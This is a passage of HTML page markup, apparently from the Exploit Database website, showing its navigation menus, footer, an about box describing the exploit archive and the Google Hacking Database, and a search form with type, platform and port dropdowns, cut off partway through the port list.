+                   target="_blank" rel="noopener">OSCP
+                </a>
+                <a class="dropdown-item"
+                   href="/wireless-attacks-training"
+                   target="_blank" rel="noopener">OSWP
+                </a>
+                <a class="dropdown-item"
+                   href="/evasion-techniques-breaching-defenses"
+                   target="_blank" rel="noopener">OSEP
+                </a>
+                <a class="dropdown-item"
+                   href="/advanced-web-attacks"
+                   target="_blank" rel="noopener">OSWE
+                </a>
+                <a class="dropdown-item"
+                   href="/windows-user-mode-exploit-development"
+                   target="_blank" rel="noopener">OSED
+                </a>
+                <a class="dropdown-item"
+                   href="https://www.offensive-security.com/awe-osee/"
+                   target="_blank" rel="noopener">OSEE
+                </a>
+                <a class="dropdown-item" href="https://kali.training/"
+                   target="_blank" rel="noopener">KLCP
+                </a>
+
+            </div>
+
+        </div>
+
+        <div class="btn-group btn-block mt-1">
+
+            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Training
+            </a>
+
+            <div class="dropdown-menu" aria-labelledby="dropdownTraining">
+
+                <a class="dropdown-item"
+                   href="/pentest-training-with-kali-linux"
+                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
+                   <br />All new for 2020
+                </a>
+                <a class="dropdown-item"
+                   href="/wireless-attacks-training"
+                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
+                </a>
+                <a class="dropdown-item"
+                   href="/evasion-techniques-breaching-defenses"
+                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
+                   <br />All new for 2020
+                </a>
+                <a class="dropdown-item"
+                   href="/advanced-web-attacks"
+                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
+                   <br />Updated for 2020
+                </a>
+                <a class="dropdown-item"
+                   href="/windows-user-mode-exploit-development"
+                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
+                   <br />All new for 2021
+                </a>
+<!--
+                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
+                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
+                </a>
+-->
+                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
+                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
+                </a>
+
+            </div>
+
+        </div>
+
+        <div class="btn-group btn-block mt-1">
+
+            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                Pro Services
+            </a>
+
+            <div class="dropdown-menu" aria-labelledby="dropdownServices">
+
+                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
+                   target="_blank" rel="noopener">Penetration Testing
+                </a>
+                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
+                   target="_blank" rel="noopener">Advanced Attack Simulation
+                </a>
+                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
+                   target="_blank" rel="noopener">Application Security Assessment
+                </a>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+                </div>
+
+            </div>
+
+        </div>
+
+    </div>
+
+
+        
+        <footer class="footer">
+
+    <div class="container-fluid">
+
+        <nav>
+
+            <ul>
+
+                <li>
+                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">
+
+    <i class="mdi mdi-twitter mdi-36px"></i>
+
+</a>
+
+
+<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">
+
+    <i class="mdi mdi-facebook mdi-36px"></i>
+</a>
+
+<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">
+
+    <i class="mdi mdi-github-circle mdi-36px"></i>
+</a>                </li>
+
+                <li>
+
+                    <a href="/">
+                        Exploit Database by Offensive Security
+                    </a>
+
+                </li>
+
+                <li>
+
+                    <a href="/terms">
+                        Terms
+                    </a>
+
+                </li>
+
+                <li>
+
+                    <a href="/privacy">
+                        Privacy
+                    </a>
+
+                </li>
+
+                <li>
+
+                    <a href="#" data-toggle="modal" data-target="#about">
+                        About Us
+                    </a>
+
+                </li>
+
+                <li>
+
+                    <a href="/faq">
+                        FAQ
+                    </a>
+
+                </li>
+
+                <li>
+
+                    <a href="/cookies">
+                        Cookies
+                    </a>
+
+                </li>
+
+            </ul>
+
+        </nav>
+
+        <div class="copyright mt-4">
+
+            &copy;
+            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.
+
+        </div>
+
+    </div>
+
+    <!-- About EDB/GHDB Modal -->
+<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
+     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">
+
+    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
+         role="document">
+
+        <div class="modal-content">
+
+            <div class="modal-header">
+
+                <h5 class="modal-title"
+                    id="aboutModalTitle">About The Exploit Database
+                </h5>
+
+                <button type="button" class="close" data-dismiss="modal"
+                        aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+
+            </div>
+
+            <div class="modal-body">
+
+                <div class="row">
+
+                    <p>
+                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
+                            <img class="float-left" src="/images/offsec-logo-gray-trans-300x171.png"
+                                 alt="Offensive Security">
+                        </a>
+                        The Exploit Database is maintained by <a
+                                href="https://www.offensive-security.com/community-projects/"
+                                target="_blank" rel="noopener">Offensive Security</a>, an information security training company
+                        that provides various <a
+                                href="https://www.offensive-security.com/courses-and-certifications/"
+                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
+                                href="https://www.offensive-security.com/penetration-testing/"
+                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
+                        non-profit project that is provided as a public service by Offensive Security.
+                    </p>
+
+                    <p>The Exploit Database is a <a
+                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
+                            compliant</a> archive of public exploits and corresponding vulnerable software,
+                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
+                        the most comprehensive collection of exploits gathered through direct submissions, mailing
+                        lists, as well as other public sources, and present them in a freely-available and
+                        easy-to-navigate database. The Exploit Database is a repository for exploits and
+                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
+                        actionable data right away.
+                    </p>
+
+                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
+                        is a categorized index of Internet search engine queries designed to uncover interesting,
+                        and usually sensitive, information made publicly available on the Internet. In most cases,
+                        this information was never meant to be made public but due to any number of factors this
+                        information was linked in a web document that was crawled by a search engine that
+                        subsequently followed that link and indexed the sensitive information.
+                    </p>
+
+                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
+                        Long, a professional hacker, who began cataloging these queries in a database known as the
+                        Google Hacking Database. His initial efforts were amplified by countless hours of community
+                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
+                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
+                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
+                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
+                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
+                        the fact that this was not a “Google problem” but rather the result of an often
+                        unintentional misconfiguration on the part of a user or a program installed by the user.
+                        Over time, the term “dork” became shorthand for a search query that located sensitive
+                        information and “dorks” were included with may web application vulnerability releases to
+                        show examples of vulnerable web sites.
+                    </p>
+
+                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
+                        over to <a
+                                href="https://www.offensive-security.com/community-projects/"
+                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
+                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
+                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
+                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
+                        producing different, yet equally valuable results.
+                    </p>
+
+
+                </div>
+
+            </div>
+
+            <div class="modal-footer">
+
+                <button type="button"
+                        class="btn btn-primary"
+                        data-dismiss="modal">Close
+                </button>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
+     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">
+
+    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
+         role="document">
+
+        <div class="modal-content">
+
+            <div class="modal-header">
+
+                <h5 class="modal-title text-primary"
+                    id="resourcesModalTitle">Offensive Security Resources
+                </h5>
+
+                <button type="button" class="close" data-dismiss="modal"
+                        aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+
+            </div>
+
+            <div class="modal-body">
+
+                <table class="table dataTable table-borderless">
+
+                            <thead>
+
+                            <tr>
+                                <th class="text-center"><strong>Downloads</strong></th>
+                                <th class="text-center"><strong>Certifications</strong></th>
+                                <th class="text-center"><strong>Training</strong></th>
+                                <th class="text-center"><strong>Services</strong></th>
+                            </tr>
+
+                            </thead>
+
+                            <tbody>
+
+                            <tr class="text-center">
+
+                                <td>
+                                    <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
+                                        Kali Linux
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/pentest-training-with-kali-linux"
+                                       target="_blank" rel="noopener">OSCP
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/pentest-training-with-kali-linux"
+                                       target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
+                                       <br />All new for 2020
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="https://www.offensive-security.com/penetration-testing/"
+                                       target="_blank" rel="noopener">Penetration Testing
+                                    </a>
+                                </td>
+
+                            </tr>
+
+                            <tr class="text-center">
+
+                                <td>
+                                    <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
+                                       target="_blank" rel="noopener">
+                                        Kali NetHunter
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/wireless-attacks-training"
+                                       target="_blank" rel="noopener">OSWP
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/wireless-attacks-training"
+                                       target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="https://www.offensive-security.com/penetration-testing/#other-services"
+                                       target="_blank" rel="noopener">Advanced Attack Simulation
+                                    </a>
+                                </td>
+
+                            </tr>
+
+                            <tr class="text-center">
+
+                                <td>
+                                    <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
+                                       target="_blank" rel="noopener">Kali Linux Revealed Book
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/evasion-techniques-breaching-defenses"
+                                       target="_blank" rel="noopener">OSEP
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/evasion-techniques-breaching-defenses"
+                                       target="_blank" rel="noopener">Evasion Techniques and breaching Defences (PEN-300)
+                                       <br />All new for 2020
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="https://www.offensive-security.com/penetration-testing/#asa"
+                                       target="_blank" rel="noopener">Application Security Assessment
+                                    </a>
+                                </td>
+
+                            </tr>
+
+                            <tr class="text-center">
+                                <td></td>
+                                <td>
+                                    <a href="/advanced-web-attacks"
+                                       target="_blank" rel="noopener">OSWE
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/advanced-web-attacks"
+                                       target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
+                                       <br />Updated for 2020
+                                    </a>
+                                </td>
+                                <td></td>
+                            </tr>
+
+                            <tr class="text-center">
+                                <td></td>
+                                <td>
+                                    <a href="/windows-user-mode-exploit-development"
+                                       target="_blank" rel="noopener">OSED
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="/windows-user-mode-exploit-development"
+                                       target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
+                                       <br />All new for 2021
+                                    </a>
+                                </td>
+                                <td></td>
+                            </tr>
+
+                            <tr class="text-center">
+                                <td></td>
+                                <td>
+                                    <a href="https://www.offensive-security.com/awe-osee/"
+                                       target="_blank" rel="noopener">OSEE
+                                    </a>
+                                </td>
+                                <td>
+<!--
+                                    <a href="https://www.offensive-security.com/metasploit-unleashed/"
+                                       target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
+                                    </a>
+-->
+                                </td>
+                                <td></td>
+                            </tr>
+
+                            <tr class="text-center">
+                                <td></td>
+                                <td>
+                                    <a href="https://kali.training/"
+                                       target="_blank" rel="noopener">KLCP
+                                    </a>
+                                </td>
+                                <td>
+                                    <a href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
+                                       target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
+                                    </a>
+                                </td>
+                                <td></td>
+                            </tr>
+
+                            </tbody>
+
+                        </table>
+
+            </div>
+
+            <div class="modal-footer">
+
+                <button type="button"
+                        class="btn btn-primary"
+                        data-dismiss="modal">Close
+                </button>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+    <!-- Advanced Search Modal -->
+<div class="modal fade bd-example-modal-lg" id="search" tabindex="-1"
+     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">
+
+    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
+         role="document">
+
+        <div class="modal-content">
+
+            <div class="modal-header">
+
+                <h5 class="modal-title"
+                    id="searchModalTitle">Search The Exploit Database
+                </h5>
+
+                <button type="button" class="close" data-dismiss="modal"
+                        aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+
+            </div>
+
+            <div class="modal-body">
+
+                <form action="https://www.exploit-db.com/search" method="GET" id="searchForm">
+
+                    <div class="row">
+
+                        <div class="col-sm-12 col-lg-8">
+
+                            <div class="form-group">
+
+                                <label for="titleSearch" class="control-label text-primary">Title</label>
+
+                                <input id="titleSearch" class="form-control" type="text" name="q" class="q"
+                                       placeholder="Title" value="" autofocus>
+
+                            </div>
+
+                        </div>
+
+                        <div class="col-sm-6 col-lg-4">
+
+                            <div class="form-group">
+
+                                <label for="cveSearch" class="control-label text-primary">CVE</label>
+
+                                <input id="cveSearch" class="form-control" type="text" name="cve" class="cve"
+                                       placeholder="2021-1234"
+                                       value="" autofocus>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                    <div class="row">
+
+                        <div class="col-sm-6 col-lg-4">
+
+                            <label for="typeSearchSelect" class="text-primary">Type</label>
+
+                            <select id="typeSearchSelect" name="type" class="form-control">
+
+                                <option></option>
+                                
+                                    <option value="dos" >
+                                        dos
+                                    </option>
+
+
+                                
+                                    <option value="local" >
+                                        local
+                                    </option>
+
+
+                                
+                                    <option value="remote" >
+                                        remote
+                                    </option>
+
+
+                                
+                                    <option value="shellcode" >
+                                        shellcode
+                                    </option>
+
+
+                                
+                                    <option value="papers" >
+                                        papers
+                                    </option>
+
+
+                                
+                                    <option value="webapps" >
+                                        webapps
+                                    </option>
+
+
+                                
+                            </select>
+
+                        </div>
+
+                        <div class="col-sm-6 col-lg-4">
+
+                            <label for="platformSearchSelect" class="text-primary">Platform</label>
+
+                            <select id="platformSearchSelect" name="platform" class="form-control">
+
+                                <option></option>
+                                
+                                    <option value="aix" >
+                                        AIX
+                                    </option>
+
+                                
+                                    <option value="asp" >
+                                        ASP
+                                    </option>
+
+                                
+                                    <option value="bsd" >
+                                        BSD
+                                    </option>
+
+                                
+                                    <option value="bsd_ppc" >
+                                        BSD_PPC
+                                    </option>
+
+                                
+                                    <option value="bsd_x86" >
+                                        BSD_x86
+                                    </option>
+
+                                
+                                    <option value="bsdi_x86" >
+                                        BSDi_x86
+                                    </option>
+
+                                
+                                    <option value="cgi" >
+                                        CGI
+                                    </option>
+
+                                
+                                    <option value="freebsd" >
+                                        FreeBSD
+                                    </option>
+
+                                
+                                    <option value="freebsd_x86" >
+                                        FreeBSD_x86
+                                    </option>
+
+                                
+                                    <option value="freebsd_x86-64" >
+                                        FreeBSD_x86-64
+                                    </option>
+
+                                
+                                    <option value="generator" >
+                                        Generator
+                                    </option>
+
+                                
+                                    <option value="hardware" >
+                                        Hardware
+                                    </option>
+
+                                
+                                    <option value="hp-ux" >
+                                        HP-UX
+                                    </option>
+
+                                
+                                    <option value="irix" >
+                                        IRIX
+                                    </option>
+
+                                
+                                    <option value="jsp" >
+                                        JSP
+                                    </option>
+
+                                
+                                    <option value="linux" >
+                                        Linux
+                                    </option>
+
+                                
+                                    <option value="linux_mips" >
+                                        Linux_MIPS
+                                    </option>
+
+                                
+                                    <option value="linux_ppc" >
+                                        Linux_PPC
+                                    </option>
+
+                                
+                                    <option value="linux_sparc" >
+                                        Linux_SPARC
+                                    </option>
+
+                                
+                                    <option value="linux_x86" >
+                                        Linux_x86
+                                    </option>
+
+                                
+                                    <option value="linux_x86-64" >
+                                        Linux_x86-64
+                                    </option>
+
+                                
+                                    <option value="minix" >
+                                        MINIX
+                                    </option>
+
+                                
+                                    <option value="multiple" >
+                                        Multiple
+                                    </option>
+
+                                
+                                    <option value="netbsd_x86" >
+                                        NetBSD_x86
+                                    </option>
+
+                                
+                                    <option value="novell" >
+                                        Novell
+                                    </option>
+
+                                
+                                    <option value="openbsd" >
+                                        OpenBSD
+                                    </option>
+
+                                
+                                    <option value="openbsd_x86" >
+                                        OpenBSD_x86
+                                    </option>
+
+                                
+                                    <option value="osx_ppc" >
+                                        OSX_PPC
+                                    </option>
+
+                                
+                                    <option value="osx" >
+                                        OSX
+                                    </option>
+
+                                
+                                    <option value="php" >
+                                        PHP
+                                    </option>
+
+                                
+                                    <option value="plan9" >
+                                        Plan9
+                                    </option>
+
+                                
+                                    <option value="qnx" >
+                                        QNX
+                                    </option>
+
+                                
+                                    <option value="sco" >
+                                        SCO
+                                    </option>
+
+                                
+                                    <option value="sco_x86" >
+                                        SCO_x86
+                                    </option>
+
+                                
+                                    <option value="solaris" >
+                                        Solaris
+                                    </option>
+
+                                
+                                    <option value="solaris_sparc" >
+                                        Solaris_SPARC
+                                    </option>
+
+                                
+                                    <option value="solaris_x86" >
+                                        Solaris_x86
+                                    </option>
+
+                                
+                                    <option value="tru64" >
+                                        Tru64
+                                    </option>
+
+                                
+                                    <option value="ultrix" >
+                                        ULTRIX
+                                    </option>
+
+                                
+                                    <option value="unix" >
+                                        Unix
+                                    </option>
+
+                                
+                                    <option value="unixware" >
+                                        UnixWare
+                                    </option>
+
+                                
+                                    <option value="windows_x86" >
+                                        Windows_x86
+                                    </option>
+
+                                
+                                    <option value="windows_x86-64" >
+                                        Windows_x86-64
+                                    </option>
+
+                                
+                                    <option value="windows" >
+                                        Windows
+                                    </option>
+
+                                
+                                    <option value="arm" >
+                                        ARM
+                                    </option>
+
+                                
+                                    <option value="cfm" >
+                                        CFM
+                                    </option>
+
+                                
+                                    <option value="netware" >
+                                        Netware
+                                    </option>
+
+                                
+                                    <option value="superh_sh4" >
+                                        SuperH_SH4
+                                    </option>
+
+                                
+                                    <option value="java" >
+                                        Java
+                                    </option>
+
+                                
+                                    <option value="beos" >
+                                        BeOS
+                                    </option>
+
+                                
+                                    <option value="immunix" >
+                                        Immunix
+                                    </option>
+
+                                
+                                    <option value="palm_os" >
+                                        Palm_OS
+                                    </option>
+
+                                
+                                    <option value="atheos" >
+                                        AtheOS
+                                    </option>
+
+                                
+                                    <option value="ios" >
+                                        iOS
+                                    </option>
+
+                                
+                                    <option value="android" >
+                                        Android
+                                    </option>
+
+                                
+                                    <option value="xml" >
+                                        XML
+                                    </option>
+
+                                
+                                    <option value="perl" >
+                                        Perl
+                                    </option>
+
+                                
+                                    <option value="python" >
+                                        Python
+                                    </option>
+
+                                
+                                    <option value="system_z" >
+                                        System_z
+                                    </option>
+
+                                
+                                    <option value="json" >
+                                        JSON
+                                    </option>
+
+                                
+                                    <option value="ashx" >
+                                        ASHX
+                                    </option>
+
+                                
+                                    <option value="ruby" >
+                                        Ruby
+                                    </option>
+
+                                
+                                    <option value="aspx" >
+                                        ASPX
+                                    </option>
+
+                                
+                                    <option value="macos" >
+                                        macOS
+                                    </option>
+
+                                
+                                    <option value="linux_crisv32" >
+                                        Linux_CRISv32
+                                    </option>
+
+                                
+                                    <option value="ezine" >
+                                        eZine
+                                    </option>
+
+                                
+                                    <option value="magazine" >
+                                        Magazine
+                                    </option>
+
+                                
+                                    <option value="nodejs" >
+                                        NodeJS
+                                    </option>
+
+                                
+                                    <option value="alpha" >
+                                        Alpha
+                                    </option>
+
+                                
+                                    <option value="solaris_mips" >
+                                        Solaris_MIPS
+                                    </option>
+
+                                
+                                    <option value="lua" >
+                                        Lua
+                                    </option>
+
+                                
+                                    <option value="watchos" >
+                                        watchOS
+                                    </option>
+
+                                
+                                    <option value="vxworks" >
+                                        VxWorks
+                                    </option>
+
+                                
+                                    <option value="python2" >
+                                        Python2
+                                    </option>
+
+                                
+                                    <option value="python3" >
+                                        Python3
+                                    </option>
+
+                                
+                            </select>
+
+                        </div>
+
+                        <div class="col-sm-6 col-lg-4">
+
+                            <div class="form-group">
+
+                                <label for="authorSearch" class="text-primary">Author</label>
+
+                                <input id="authorSearch" class="form-control" type="text" name="e_author"
+                                       placeholder="Author" value="">
+
+                            </div>
+                        </div>
+
+                    </div>
+
+                    <div class="row">
+
+                        <div class="col-sm-12 col-lg-6">
+
+                            <div class="form-group">
+
+                                <label for="textSearch" class="control-label text-primary">Content</label>
+
+                                <input id="textSearch" class="form-control" type="text" name="text"
+                                       placeholder="Exploit content" value="">
+
+                            </div>
+
+                        </div>
+
+                        <div class="col-sm-6 col-lg-2">
+
+                            <label for="portSearchSelect" class="text-primary">Port</label>
+
+                            <select id="portSearchSelect" name="port" class="form-control">
+
+                                <option></option>
+                                
+                                    <option value="14" >
+                                        14
+                                    </option>
+
+
+                                
+                                    <option value="21" >
+                                        21
+                                    </option>
+
+
+                                
+                                    <option value="22" >
+                                        22
+                                    </option>
+
+
+                                
+                                    <option value="23" >
+                                        23
+                                    </option>
+
+
+                                
+                                    <option value="25" >
+                                        25
+                                    </option>
+
+
+                                
+                                    <option value="42" >
+                                        42
+                                    </option>
+
+
+                                
+                                    <option value="49" >
+                                        49
+                                    </option>
+
+
+                                
+                                    <option value="53" >
+                                        53
+                                    </option>
+
+
+                                
+                                    <option value="66" >
+                                        66
+                                    </option>
+
+
+                                
+                                    <option value="69" >
+                                        69
+                                    </option>
+
+
+                                
+                                    <option value="70" >
+                                        70
+                                    </option>
+
+
+                                
+                                    <option value="79" >
+                                        79
+                                    </option>
+
+
+                                
+                                    <option value="80" >
+                                        80
+                                    </option>
+
+
+                                
+                                    <option value="81" >
+                                        81
+                                    </option>
+
+
+                                
+                                    <option value="102" >
+                                        102
+                                    </option>
+
+
+                                
+                                    <option value="105" >
+                                        105
+                                    </option>
+
+
+                                
+                                    <option value="110" >
+                                        110
+                                    </option>
+
+
+                                
+                                    <option value="111" >
+                                        111
+                                    </option>
+
+
+                                
+                                    <option value="113" >
+                                        113
+                                    </option>
+
+
+                                
+                                    <option value="119" >
+                                        119
+                                    </option>
+
+
+                                
+                                    <option value="123" >
+                                        123
+                                    </option>
+
+
+                                
+                                    <option value="135" >
+                                        135
+                                    </option>
+
+
+                                
+                                    <option value="139" >
+                                        139
+                                    </option>
+
+
+                                
+                                    <option value="143" >
+                                        143
+                                    </option>
+
+
+                                
+                                    <option value="161" >
+                                        161
+                                    </option>
+
+
+                                
+                                    <option value="162" >
+                                        162
+                                    </option>
+
+
+                                
+                                    <option value="164" >
+                                        164
+                                    </option>
+
+
+                                
+                                    <option value="383" >
+                                        383
+                                    </option>
+
+
+                                
+                                    <option value="389" >
+                                        389
+                                    </option>
+
+
+                                
+                                    <option value="402" >
+                                        402
+                                    </option>
+
+
+                                
+                                    <option value="406" >
+                                        406
+                                    </option>
+
+
+                                
+                                    <option value="411" >
+                                        411
+                                    </option>
+
+
+                                
+                                    <option value="443" >
+                                        443
+                                    </option>
+
+
+                                
+                                    <option value="444" >
+                                        444
+                                    </option>
+
+
+                                
+                                    <option value="445" >
+                                        445
+                                    </option>
+
+
+                                
+                                    <option value="446" >
+                                        446
+                                    </option>
+
+
+                                
+                                    <option value="502" >
+                                        502
+                                    </option>
+
+
+                                
+                                    <option value="504" >
+                                        504
+                                    </option>
+
+
+                                
+                                    <option value="513" >
+                                        513
+                                    </option>
+
+
+                                
+                                    <option value="514" >
+                                        514
+                                    </option>
+
+
+                                
+                                    <option value="515" >
+                                        515
+                                    </option>
+
+
+                                
+                                    <option value="532" >
+                                        532
+                                    </option>
+
+
+                                
+                                    <option value="548" >
+                                        548
+                                    </option>
+
+
+                                
+                                    <option value="554" >
+                                        554
+                                    </option>
+
+
+                                
+                                    <option value="555" >
+                                        555
+                                    </option>
+
+
+                                
+                                    <option value="617" >
+                                        617
+                                    </option>
+
+
+                                
+                                    <option value="623" >
+                                        623
+                                    </option>
+
+
+                                
+                                    <option value="631" >
+                                        631
+                                    </option>
+
+
+                                
+                                    <option value="655" >
+                                        655
+                                    </option>
+
+
+                                
+                                    <option value="689" >
+                                        689
+                                    </option>
+
+
+                                
+                                    <option value="783" >
+                                        783
+                                    </option>
+
+
+                                
+                                    <option value="787" >
+                                        787
+                                    </option>
+
+
+                                
+                                    <option value="808" >
+                                        808
+                                    </option>
+
+
+                                
+                                    <option value="873" >
+                                        873
+                                    </option>
+
+
+                                
+                                    <option value="888" >
+                                        888
+                                    </option>
+
+
+                                
+                                    <option value="901" >
+                                        901
+                                    </option>
+
+
+                                
+                                    <option value="998" >
+                                        998
+                                    </option>
+
+
+                                
+                                    <option value="1000" >
+                                        1000
+                                    </option>
+
+
+                                
+                                    <option value="1040" >
+                                        1040
+                                    </option>
+
+
+                                
+                                    <option value="1089" >
+                                        1089
+                                    </option>
+
+
+                                
+                                    <option value="1099" >
+                                        1099
+                                    </option>
+
+
+                                
+                                    <option value="1100" >
+                                        1100
+                                    </option>
+
+
+                                
+                                    <option value="1114" >
+                                        1114
+                                    </option>
+
+
+                                
+                                    <option value="1120" >
+                                        1120
+                                    </option>
+
+
+                                
+                                    <option value="1194" >
+                                        1194
+                                    </option>
+
+
+                                
+                                    <option value="1235" >
+                                        1235
+                                    </option>
+
+
+                                
+                                    <option value="1471" >
+                                        1471
+                                    </option>
+
+
+                                
+                                    <option value="1521" >
+                                        1521
+                                    </option>
+
+
+                                
+                                    <option value="1533" >
+                                        1533
+                                    </option>
+
+
+                                
+                                    <option value="1581" >
+                                        1581
+                                    </option>
+
+
+                                
+                                    <option value="1589" >
+                                        1589
+                                    </option>
+
+
+                                
+                                    <option value="1604" >
+                                        1604
+                                    </option>
+
+
+                                
+                                    <option value="1617" >
+                                        1617
+                                    </option>
+
+
+                                
+                                    <option value="1723" >
+                                        1723
+                                    </option>
+
+
+                                
+                                    <option value="1743" >
+                                        1743
+                                    </option>
+
+
+                                
+                                    <option value="1761" >
+                                        1761
+                                    </option>
+
+
+                                
+                                    <option value="1812" >
+                                        1812
+                                    </option>
+
+
+                                
+                                    <option value="1858" >
+                                        1858
+                                    </option>
+
+
+                                
+                                    <option value="1861" >
+                                        1861
+                                    </option>
+
+
+                                
+                                    <option value="1900" >
+                                        1900
+                                    </option>
+
+
+                                
+                                    <option value="1947" >
+                                        1947
+                                    </option>
+
+
+                                
+                                    <option value="2000" >
+                                        2000
+                                    </option>
+
+
+                                
+                                    <option value="2022" >
+                                        2022
+                                    </option>
+
+
+                                
+                                    <option value="2049" >
+                                        2049
+                                    </option>
+
+
+                                
+                                    <option value="2100" >
+                                        2100
+                                    </option>
+
+
+                                
+                                    <option value="2103" >
+                                        2103
+                                    </option>
+
+
+                                
+                                    <option value="2121" >
+                                        2121
+                                    </option>
+
+
+                                
+                                    <option value="2125" >
+                                        2125
+                                    </option>
+
+
+                                
+                                    <option value="2181" >
+                                        2181
+                                    </option>
+
+
+                                
+                                    <option value="2242" >
+                                        2242
+                                    </option>
+
+
+                                
+                                    <option value="2315" >
+                                        2315
+                                    </option>
+
+
+                                
+                                    <option value="2375" >
+                                        2375
+                                    </option>
+
+
+                                
+                                    <option value="2380" >
+                                        2380
+                                    </option>
+
+
+                                
+                                    <option value="2381" >
+                                        2381
+                                    </option>
+
+
+                                
+                                    <option value="2401" >
+                                        2401
+                                    </option>
+
+
+                                
+                                    <option value="2480" >
+                                        2480
+                                    </option>
+
+
+                                
+                                    <option value="2525" >
+                                        2525
+                                    </option>
+
+
+                                
+                                    <option value="2640" >
+                                        2640
+                                    </option>
+
+
+                                
+                                    <option value="2810" >
+                                        2810
+                                    </option>
+
+
+                                
+                                    <option value="2812" >
+                                        2812
+                                    </option>
+
+
+                                
+                                    <option value="2947" >
+                                        2947
+                                    </option>
+
+
+                                
+                                    <option value="2954" >
+                                        2954
+                                    </option>
+
+
+                                
+                                    <option value="2990" >
+                                        2990
+                                    </option>
+
+
+                                
+                                    <option value="3000" >
+                                        3000
+                                    </option>
+
+
+                                
+                                    <option value="3030" >
+                                        3030
+                                    </option>
+
+
+                                
+                                    <option value="3050" >
+                                        3050
+                                    </option>
+
+
+                                
+                                    <option value="3052" >
+                                        3052
+                                    </option>
+
+
+                                
+                                    <option value="3128" >
+                                        3128
+                                    </option>
+
+
+                                
+                                    <option value="3129" >
+                                        3129
+                                    </option>
+
+
+                                
+                                    <option value="3181" >
+                                        3181
+                                    </option>
+
+
+                                
+                                    <option value="3200" >
+                                        3200
+                                    </option>
+
+
+                                
+                                    <option value="3217" >
+                                        3217
+                                    </option>
+
+
+                                
